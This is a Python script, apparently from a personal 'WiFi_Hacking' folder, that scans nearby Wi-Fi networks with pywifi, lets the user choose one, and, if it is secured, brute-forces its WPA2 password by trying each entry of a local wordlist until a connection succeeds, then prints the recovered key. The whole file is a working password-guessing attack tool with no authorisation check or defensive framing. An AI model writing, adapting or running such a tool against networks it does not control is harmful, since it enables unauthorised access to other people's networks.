#!/usr/bin/env python
# coding: utf-8

import time
import pywifi
from pywifi import const
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return [network.ssid for network in networks if network.ssid]  # Filter out empty SSIDs

# Function to attempt connecting to an open network
def connect_open_network(interface, ssid):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to attempt connecting to a secured network with a password
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Main function
def main():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]  # Assuming a single Wi-Fi interface
    print(f"{Fore.CYAN}Interface Name: {interface.name()}{Style.RESET_ALL}")

    # Step 1: Scan for available networks
    available_devices = scan_networks(interface)
    
    if not available_devices:
        print(f"{Fore.RED}No networks found. Exiting...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.YELLOW}Available Networks:{Style.RESET_ALL}")
    for idx, ssid in enumerate(available_devices, start=1):
        print(f"{Fore.GREEN}[{idx}] {ssid}{Style.RESET_ALL}")

    # Step 2: Let the user choose a network
    while True:
        try:
            choice = int(input(f"\n{Fore.CYAN}Enter the number of the WiFi network to connect to: {Style.RESET_ALL}"))
            if 1 <= choice <= len(available_devices):
                selected_ssid = available_devices[choice - 1]
                break
            else:
                print(f"{Fore.RED}Invalid choice. Please select a valid number.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

    print(f"{Fore.BLUE}You selected: {selected_ssid}{Style.RESET_ALL}")

    # Step 3: Try to connect to the selected open network
    if connect_open_network(interface, selected_ssid):
        print(f"{Fore.GREEN}Success: Open network {selected_ssid} has no password! Connected successfully.{Style.RESET_ALL}")
        return  # Stop after connecting to the first open network

    print(f"{Fore.YELLOW}Selected network requires a password. Trying brute-force attack...{Style.RESET_ALL}")

    # Step 4: Attempt to read the password list file
    try:
        with open(r'E:\Desktop\WiFi_Hacking\test.txt', 'r') as f:
            keys = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: 'test.txt' file not found. Please make sure the file exists.{Style.RESET_ALL}")
        return

    # Step 5: Try to connect to the secured network using the password list
    for password in keys:
        print(f"Trying password: {Fore.BLUE}{password}{Style.RESET_ALL} for SSID: {Fore.YELLOW}{selected_ssid}{Style.RESET_ALL}")
        if connect_secured_network(interface, selected_ssid, password):
            print(f"{Fore.GREEN}Success: Password of the network {selected_ssid} is {password}{Style.RESET_ALL}")
            return
        else:
            print(f"{Fore.RED}Failed: {password} did not work for {selected_ssid}{Style.RESET_ALL}")

    print(f"{Fore.RED}Could not find the correct password for {selected_ssid}.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()

